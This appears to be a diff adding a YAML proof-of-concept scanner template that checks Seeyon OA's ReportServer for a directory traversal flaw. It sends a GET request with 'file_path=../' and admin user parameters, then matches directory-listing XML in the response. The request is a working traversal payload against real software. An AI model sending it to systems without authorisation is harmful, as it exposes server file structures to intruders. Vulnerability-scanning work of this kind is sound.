@@ -1,0 +1,17 @@
+name: yaml-poc-seeyon-seeyon_oa-directory_traversal-CT-469708
+binding: e7ac3346-ac59-486f-bad0-eceeae639294
+detail:
+    author: system_user
+    vulnerability:
+        id: df2d292d-027e-4942-bc5a-d14705b339ac
+        level: medium
+    warning: Harmless
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
+        expression: response.status == 200 && response.body.bcontains(b"<Node isDir=\"true\" envPath=\"") && response.body.bcontains(b"<NODES xmlVersion=\"")
+expression: r0()
